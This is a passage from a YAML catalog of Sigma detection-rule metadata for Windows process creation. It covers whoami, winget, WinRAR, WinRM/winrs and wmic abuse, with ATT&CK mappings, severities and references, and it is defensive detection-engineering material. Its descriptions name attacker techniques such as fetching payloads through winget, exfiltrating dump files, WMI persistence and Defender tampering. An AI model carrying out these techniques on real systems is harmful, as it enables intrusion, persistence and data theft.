  - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/
  - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/
  - https://www.youtube.com/watch?v=DsJ9ByX84o4&t=6s
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8de1cbe8-d6f5-496d-8237-5f44a721c7a0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_whoami_parent_anomaly.yml
  name: Whoami.EXE Execution Anomaly
  description: Detects the execution of whoami.exe with suspicious parent processes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  - car.2016-03-001
  time_window: ''
  references:
  - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/
  - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/
  - https://www.youtube.com/watch?v=DsJ9ByX84o4&t=6s
  false_positives:
  - Admin activity
  - Scripts and administrative tools used in the monitored environment
  - Monitoring activity
  notes: ''
- detection_id: 97a80ec7-0e2f-4d05-9ef4-65760e634f6b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_whoami_priv_discovery.yml
  name: Security Privileges Enumeration Via Whoami.EXE
  description: Detects a whoami.exe executed with the /priv command line flag instructing
    the tool to show all current user privileges. This is often used after a privilege
    escalation attempt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.privilege-escalation
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8de89e52-f6e1-4b5b-afd1-41ecfa300d48
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_windows_terminal_susp_children.yml
  name: Suspicious WindowsTerminal Child Processes
  description: Detects suspicious children spawned via the Windows Terminal application
    which could be a sign of persistence via WindowsTerminal (see references section)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques: []
  tags:
  - attack.execution
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/windowsterminalprofile.html
  - https://twitter.com/nas_bench/status/1550836225652686848
  false_positives:
  - Other legitimate "Windows Terminal" profiles
  notes: ''
- detection_id: 05ebafc8-7aa2-4bcd-a269-2aec93f9e842
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winget_add_custom_source.yml
  name: Add New Download Source To Winget
  description: Detects usage of winget to add new additional download sources
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/package-manager/winget/source
  - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget
  false_positives:
  - False positive are expected with legitimate sources
  notes: ''
- detection_id: 81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winget_add_insecure_custom_source.yml
  name: Add Insecure Download Source To Winget
  description: 'Detects usage of winget to add a new insecure (http) download source.

    Winget will not allow the addition of insecure sources, hence this could indicate
    potential suspicious activity (or typos)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/package-manager/winget/source
  - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget
  false_positives:
  - False positives might occur if the users are unaware of such control checks
  notes: ''
- detection_id: c15a46a0-07d4-4c87-b4b6-89207835a83b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winget_add_susp_custom_source.yml
  name: Add Potential Suspicious New Download Source To Winget
  description: Detects usage of winget to add new potentially suspicious download
    sources
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/package-manager/winget/source
  - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget
  false_positives:
  - Unknown
  notes: ''
- detection_id: 313d6012-51a0-4d93-8dfc-de8553239e25
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winget_local_install_via_manifest.yml
  name: Install New Package Via Winget Local Manifest
  description: 'Detects usage of winget to install applications via manifest file.
    Adversaries can abuse winget to download payloads remotely and execute them.

    The manifest option enables you to install an application by passing in a YAML
    file directly to the client.

    Winget can be used to download and install exe, msi or msix files later.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/package-manager/winget/install#local-install
  - https://lolbas-project.github.io/lolbas/Binaries/Winget/
  - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget
  false_positives:
  - Some false positives are expected in some environment that may use this functionality
    to install and test their custom applications
  notes: ''
- detection_id: 1ac14d38-3dfc-4635-92c7-e3fd1c5f5bfc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winrar_exfil_dmp_files.yml
  name: Winrar Compressing Dump Files
  description: Detects execution of WinRAR in order to compress a file with a ".dmp"/".dump"
    extension, which could be a step in a process of dump file exfiltration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/
  false_positives:
  - Legitimate use of WinRAR with a command line in which ".dmp" or ".dump" appears
    accidentally
  - Legitimate use of WinRAR to compress WER ".dmp" files for troubleshooting
  notes: ''
- detection_id: 146aace8-9bd6-42ba-be7a-0070d8027b76
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winrar_susp_child_process.yml
  name: Potentially Suspicious Child Process Of WinRAR.EXE
  description: Detects potentially suspicious child processes of WinRAR.exe.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  tags:
  - attack.execution
  - attack.t1203
  time_window: ''
  references:
  - https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/
  - https://github.com/knight0x07/WinRAR-Code-Execution-Vulnerability-CVE-2023-38831/blob/26ab6c40b6d2c09bb4fc60feaa4a3a90cfd20c23/Part-1-Overview.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4ede543c-e098-43d9-a28f-dd784a13132f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winrar_uncommon_folder_execution.yml
  name: WinRAR Execution in Non-Standard Folder
  description: Detects a suspicious WinRAR execution in a folder which is not the
    default installation folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  time_window: ''
  references:
  - https://twitter.com/cyb3rops/status/1460978167628406785
  false_positives:
  - Legitimate use of WinRAR in a folder of a software that bundles WinRAR
  notes: ''
- detection_id: 074e0ded-6ced-4ebd-8b4d-53f55908119d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml
  name: AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl
  description: Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via
    winrm.vbs and copied cscript.exe (can be renamed)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9df0dd3a-1a5c-47e3-a2bc-30ed177646a0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml
  name: Remote Code Execute via Winrm.vbs
  description: Detects an attempt to execute code or create service on remote host
    via winrm.vbs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://twitter.com/bohops/status/994405551751815170
  - https://redcanary.com/blog/lateral-movement-winrm-wmi/
  - https://lolbas-project.github.io/lolbas/Scripts/Winrm/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winrm_remote_powershell_session_process.yml
  name: Remote PowerShell Session Host Process (WinRM)
  description: Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM
    host process) as a parent or child process (sign of an active PowerShell remote
    session).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.006
  - T1059.001
  tags:
  - attack.execution
  - attack.lateral-movement
  - attack.t1059.001
  - attack.t1021.006
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190511-RemotePwshExecution/notebook.html
  false_positives:
  - Legitimate usage of remote Powershell, e.g. for monitoring purposes.
  notes: ''
- detection_id: 5cc2cda8-f261-4d88-a2de-e9e193c86716
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winrm_susp_child_process.yml
  name: Suspicious Processes Spawned by WinRM
  description: Detects suspicious processes including shells spawnd from WinRM host
    process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  tags:
  - attack.t1190
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate WinRM usage
  notes: ''
- detection_id: bcfece3d-56fe-4545-9931-3b8e92927db1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winrs_local_command_execution.yml
  name: Winrs Local Command Execution
  description: 'Detects the execution of Winrs.exe where it is used to execute commands
    locally.

    Commands executed this way are launched under Winrshost.exe and can represent
    proxy execution used for defense evasion or lateral movement.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.006
  - T1218
  tags:
  - attack.lateral-movement
  - attack.defense-evasion
  - attack.t1021.006
  - attack.t1218
  time_window: ''
  references:
  - https://cardinalops.com/blog/living-off-winrm-abusing-complexity-in-remote-management/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 79df3f68-dccb-48e9-9171-b75cbc37c51d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winrshost_command_execution.yml
  name: Potential Lateral Movement via Windows Remote Shell
  description: 'Detects a child process spawned by ''winrshost.exe'', which suggests
    remote command execution through Windows Remote Shell (WinRs) and may indicate
    potential lateral movement activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.006
  tags:
  - attack.lateral-movement
  - attack.t1021.006
  time_window: ''
  references:
  - https://cardinalops.com/blog/living-off-winrm-abusing-complexity-in-remote-management/
  - https://www.ired.team/offensive-security/lateral-movement/winrs-for-lateral-movement
  false_positives:
  - Legitimate use of WinRM within the organization
  notes: ''
- detection_id: e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_winzip_password_compression.yml
  name: Compress Data and Lock With Password for Exfiltration With WINZIP
  description: An adversary may compress or encrypt data that is collected prior to
    exfiltration using 3rd party utilities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9cfc00b6-bfb7-49ce-9781-ef78503154bb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wlrmdr_uncommon_child_process.yml
  name: Wlrmdr.EXE Uncommon Argument Or Child Process
  description: 'Detects the execution of "Wlrmdr.exe" with the "-u" command line flag
    which allows anything passed to it to be an argument of the ShellExecute API,
    which would allow an attacker to execute arbitrary binaries.

    This detection also focuses on any uncommon child processes spawned from "Wlrmdr.exe"
    as a supplement for those that posses "ParentImage" telemetry.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1493963591745220608?s=20&t=xUg9DsZhJy1q9bPTUWgeIQ
  - https://lolbas-project.github.io/lolbas/Binaries/Wlrmdr/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 797011dc-44f4-4e6f-9f10-a8ceefbe566b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmi_backdoor_exchange_transport_agent.yml
  name: WMI Backdoor Exchange Transport Agent
  description: Detects a WMI backdoor in Exchange Transport Agents via WMI event filters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.003
  time_window: ''
  references:
  - https://twitter.com/cglyer/status/1182389676876980224
  - https://twitter.com/cglyer/status/1182391019633029120
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7864a175-3654-4824-9f0d-f0da18ab27c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmi_password_never_expire.yml
  name: Password Set to Never Expire via WMI
  description: 'Detects the use of wmic.exe to modify user account settings and explicitly
    disable password expiration.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1047
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1047
  - attack.t1098
  time_window: ''
  references:
  - https://www.huntress.com/blog/the-unwanted-guest
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmi_persistence_script_event_consumer.yml
  name: WMI Persistence - Script Event Consumer
  description: Detects WMI script event consumers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.003
  time_window: ''
  references:
  - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/
  false_positives:
  - Legitimate event consumers
  - Dell computers on some versions register an event consumer that is known to cause
    false positives when brightness is changed by the corresponding keyboard button
  notes: ''
- detection_id: ebef4391-1a81-4761-a40a-1db446c0e625
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_eventconsumer_creation.yml
  name: New ActiveScriptEventConsumer Created Via Wmic.EXE
  description: Detects WMIC executions in which an event consumer gets created. This
    could be used to establish persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.003
  time_window: ''
  references:
  - https://twitter.com/johnlatwc/status/1408062131321270282?s=12
  - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
  false_positives:
  - Legitimate software creating script event consumers
  notes: ''
- detection_id: 51cbac1e-eee3-4a90-b1b7-358efb81fa0a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_namespace_defender.yml
  name: Potential Windows Defender Tampering Via Wmic.EXE
  description: Detects potential tampering with Windows Defender settings such as
    adding exclusion using wmic
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1562
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1047
  - attack.t1562
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1562.001/T1562.001.md
  - https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/
  - https://www.bleepingcomputer.com/news/security/iobit-forums-hacked-to-spread-ransomware-to-its-members/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 526be59f-a573-4eea-b5f7-f0973207634d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_process_creation.yml
  name: New Process Created Via Wmic.EXE
  description: Detects new process creation using WMIC via the "process call create"
    flag
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  - car.2016-03-002
  time_window: ''
  references:
  - https://www.sans.org/blog/wmic-for-incident-response/
  - https://github.com/redcanaryco/atomic-red-team/blob/84215139ee5127f8e3a117e063b604812bd71928/atomics/T1047/T1047.md#atomic-test-5---wmi-execute-local-process
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9d7ca793-f6bd-471c-8d0f-11e68b2f0d2f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_computersystem.yml
  name: Computer System Reconnaissance Via Wmic.EXE
  description: Detects execution of wmic utility with the "computersystem" flag in
    order to obtain information about the machine such as the domain, username, model,
    etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1047
  tags:
  - attack.discovery
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3e3ceccd-6c06-48b8-b5ff-ab1d25db8c1d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_csproduct.yml
  name: Hardware Model Reconnaissance Via Wmic.EXE
  description: Detects the execution of WMIC with the "csproduct" which is used to
    obtain information such as hardware models and vendor information
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  - car.2016-03-002
  time_window: ''
  references:
  - https://jonconwayuk.wordpress.com/2014/01/31/wmic-csproduct-using-wmi-to-identify-make-and-model-of-hardware/
  - https://www.uptycs.com/blog/kuraystealer-a-bandit-using-discord-webhooks
  false_positives:
  - Unknown
  notes: ''
- detection_id: 164eda96-11b2-430b-85ff-6a265c15bf32
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_group.yml
  name: Local Groups Reconnaissance Via Wmic.EXE
  description: 'Detects the execution of "wmic" with the "group" flag.

    Adversaries may attempt to find local system groups and permission settings.

    The knowledge of local system permission groups can help adversaries determine
    which groups exist and which users belong to a particular group.

    Adversaries may use this information to determine which users have elevated permissions,
    such as the users found within the local administrators group.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: dfd2fcb7-8bd5-4daa-b132-5adb61d6ad45
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_hotfix.yml
  name: Windows Hotfix Updates Reconnaissance Via Wmic.EXE
  description: Detects the execution of wmic with the "qfe" flag in order to obtain
    information about installed hotfix updates on the system. This is often used by
    pentester and attacker enumeration scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://github.com/carlospolop/PEASS-ng/blob/fa0f2e17fbc1d86f1fd66338a40e665e7182501d/winPEAS/winPEASbat/winPEAS.bat
  - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 221b251a-357a-49a9-920a-271802777cc0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_process.yml
  name: Process Reconnaissance Via Wmic.EXE
  description: Detects the execution of "wmic" with the "process" flag, which adversary
    might use to list processes running on the compromised host or list installed
    software hotfixes and patches.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic
  false_positives:
  - Unknown
  notes: ''
- detection_id: 15434e33-5027-4914-88d5-3d4145ec25a9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_product.yml
  name: Potential Product Reconnaissance Via Wmic.EXE
  description: Detects the execution of WMIC in order to get a list of firewall and
    antivirus products
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://thedfirreport.com/2023/03/06/2022-year-in-review/
  - https://www.yeahhub.com/list-installed-programs-version-path-windows/
  - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product
  false_positives:
  - Unknown
  notes: ''
- detection_id: e568650b-5dcd-4658-8f34-ded0b1e13992
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wmic_recon_product_class.yml
  name: Potential Product Class Reconnaissance Via Wmic.EXE
  description: 'Detects the execution of WMIC in order to get a list of firewall,
    antivirus and antispywware products.

    Adversaries often enumerate security products installed on a system to identify
    security controls and potential ways to evade detection or disable protection
    mechanisms.

    This information helps them plan their next attack steps and choose appropriate
    techniques to bypass security measures.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1047
  - T1082
  tags:
  - attack.execution
  - attack.t1047
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://github.com/albertzsigovits/malware-notes/blob/c820c7fea76cf76a861b28ebc77e06100e20ec29/Ransomware/Maze.md
  - https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1
